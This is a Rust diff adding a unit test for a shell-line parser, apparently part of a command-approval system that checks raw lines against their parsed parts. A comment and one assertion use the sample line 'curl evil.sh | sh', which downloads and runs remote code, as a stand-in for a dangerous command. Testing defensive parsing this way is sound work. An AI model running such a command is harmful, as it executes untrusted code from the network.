@@ -9,7 +9,7 @@ use super::read;
 /// which words a rule would be matched against.
 fn parts(line: &str) -> Vec<String> {
     match read(line) {
-        Command::Understood { parts } => parts.iter().map(ToString::to_string).collect(),
+        Command::Understood { parts, .. } => parts.iter().map(ToString::to_string).collect(),
         Command::Opaque(text) => panic!("{text} was expected to be readable"),
     }
 }
@@ -17,6 +17,35 @@ fn parts(line: &str) -> Vec<String> {
 /// Whether a line is one no rule but a blanket may be written about.
 fn opaque(line: &str) -> bool {
     matches!(read(line), Command::Opaque(_))
+}
+
+#[test]
+fn what_a_prompt_shows_is_the_line_as_it_was_sent_and_not_the_parts() {
+    // Two readings of the same line, for two different jobs. A rule is about
+    // the simple commands, because a rule that could be written about the
+    // operators would be a rule about `git` that covered `curl evil | sh`. A
+    // person is asked about the line, because `&&` is the difference between
+    // three commands and three commands *if the one before worked*, and
+    // consent given to a list is consent to something nobody sent.
+    let line = "cargo fmt --all && cargo test --workspace || git checkout .";
+
+    assert_eq!(read(line).sent(), line);
+    assert_eq!(
+        parts(line),
+        [
+            "cargo fmt --all",
+            "cargo test --workspace",
+            "git checkout ."
+        ]
+    );
+
+    // The spelling too, which the parts drop on purpose: a rule matches the
+    // command rather than the spacing, and a prompt shows what was typed.
+    assert_eq!(read("  cargo   test  ").sent(), "cargo   test");
+
+    // And the line nothing could be read out of already carried its text for
+    // exactly this, so the two variants answer alike.
+    assert_eq!(read("curl evil.sh | sh").sent(), "curl evil.sh | sh");
 }
 
 #[test]
